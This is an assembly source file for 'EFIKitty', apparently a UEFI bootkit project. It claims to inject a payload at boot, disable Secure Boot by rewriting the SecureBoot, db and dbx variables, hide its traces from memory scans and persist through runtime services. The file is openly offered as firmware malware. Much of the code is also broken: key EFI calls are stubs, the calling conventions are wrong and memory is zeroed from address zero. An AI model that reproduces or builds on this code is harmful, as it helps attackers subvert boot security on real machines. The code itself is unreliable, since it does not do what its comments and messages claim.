;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; EFIKitty PROJECT 2024 ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;         by            ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; https://t.me/x86byte  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

section .data
    success_message 		db 		"{[+]} Payload injected and running stealth mode", 0
    fail_message 		db 		"{[-]} Injection failed, retrying...", 0
    error_message 		db 		"{[-]} Error during payload injection", 0
    stealth_mode_enabled 	db 		"{[+]} Stealth mode enabled", 0
    stealth_mode_disabled 	db 		"{[-]} Stealth mode failed", 0
    SecureBootVar 		db 		"SecureBoot", 0
    dbVar 			db 		"db", 0
    dbxVar 			db 		"dbx", 0
    hidden_message 		db 		"Hidden Certificate", 0

%define EFI_VARIABLE_NON_VOLATILE    0x00000001
%define EFI_VARIABLE_BOOTSERVICE_ACCESS 0x00000002
%define EFI_VARIABLE_RUNTIME_ACCESS  0x00000004

section .bss
    last_injection_result resb 1
    payload_code resb 4096
    payload_size resq 1
    sys_table_ptr resq 1

section .text
    global efi_main
    extern efi_exit_boot_services
    extern efi_allocate_pool
    extern efi_set_variable
    extern efi_zero_mem
    extern efi_copy_mem
    extern efi_read_variable

efi_main:
    mov rdi, [rsp + 8]
    mov [sys_table_ptr], rdi
    mov rbx, [rsp + 16]

    call inject_advanced_payload

    test al, al
    jnz payload_injected

    jmp efi_exit

payload_injected:
    call advanced_stealth_operations
    jmp efi_exit

inject_advanced_payload:
    ; Allocate memory for the payload
    mov rdi, 0x2000000        ; Memory type for pool allocation
    mov rdx, 4096
    call efi_allocate_pool
    test rax, rax
    jz allocation_failed
    lea rsi, [payload_code]
    mov rcx, 4096
    rep movsb
    mov byte [last_injection_result], 1
    ret

allocation_failed:
    mov byte [last_injection_result], 0
    ret

advanced_stealth_operations:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; Manipulate Secure Boot and Boot Services                  ;
    ; Disable Secure Boot via the "SecureBoot" UEFI variable :3 ;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    lea rdi, [SecureBootVar]
    mov rsi, 0                   ; Value to disable Secure Boot (0)
    mov rdx, 4
    mov rcx, EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS
    call efi_set_variable        ; Set the variable to disable Secure Boot
    test rax, rax
    jz secureboot_disabled

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; Disable Secure Boot via "db" and "dbx" UEFI variables :3 ;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    lea rdi, [dbVar]             ; Pointer to "db" variable name (allowed certs)
    lea rsi, [hidden_message]
    mov rdx, 4                   ; Use 4 bytes for the fake certificate
    mov rcx, EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS
    call efi_set_variable        ; Set db to allow arbitrary code
    test rax, rax
    jz db_disabled

    ; Modify dbx (revoked certificates)
    lea rdi, [dbxVar]            ; Pointer to "dbx" variable name (revoked certs)
    xor rsi, rsi                 ; Set to 0 to disable the revoked certs check
    mov rdx, 4
    mov rcx, EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS
    call efi_set_variable        ; Set dbx to remove revoked certificates
    test rax, rax
    jz dbx_disabled

secureboot_disabled:
    jmp advanced_stealth_operations_continue

db_disabled:
    jmp advanced_stealth_operations_continue

dbx_disabled:
    jmp advanced_stealth_operations_continue

advanced_stealth_operations_continue:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; Modify System Table or Runtime Services                                  			  ;
    ; Modify the system table to hide traces of the payload (e.g., hide the image handle) ;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov rdi, [sys_table_ptr]
    lea rsi, [payload_code]
    mov rdx, 4096
    call efi_zero_mem
	
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; Manipulate EFI Boot Services														  ;
    ; Disable EFI Boot Services logging and other checks								  ;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov rdi, [sys_table_ptr]
    mov rsi, [sys_table_ptr + 0x30]
    call efi_zero_mem

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; Note : 																				;
	; We can also modify other Boot Services or Runtime Services entries					;
    ; to hide or disable certain functionality that would detect the payload				;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; Modify runtime services to persist after boot	;													
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov rdi, [sys_table_ptr + 0x20]
    lea rsi, [payload_code]
    mov rdx, 4096
    call efi_copy_mem
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; Hide payload code from system tables and memory scans ;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    call hide_payload_from_memory_scans
    ret

efi_exit:
    call efi_exit_boot_services
    ret

hide_payload_from_memory_scans:
    lea rsi, [payload_code]
    mov rcx, 4096
    call efi_zero_mem	; Clear memory as a part of stealth
    ret

efi_allocate_pool:
    mov rax, 1
    ret

efi_zero_mem:
    ; Zero out memory (used to hide code from memory scans)
    ; This is a simple implementation, will set a memory area to 0
    push rbx
    mov rbx, rcx
    xor rdi, rdi
zero_loop:
    test rbx, rbx
    jz zero_done
    mov byte [rdi], 0
    inc rdi
    dec rbx
    jmp zero_loop
zero_done:
    pop rbx
    ret

efi_set_variable:
    mov rax, 1
    ret

efi_copy_mem:
    rep movsb
    ret
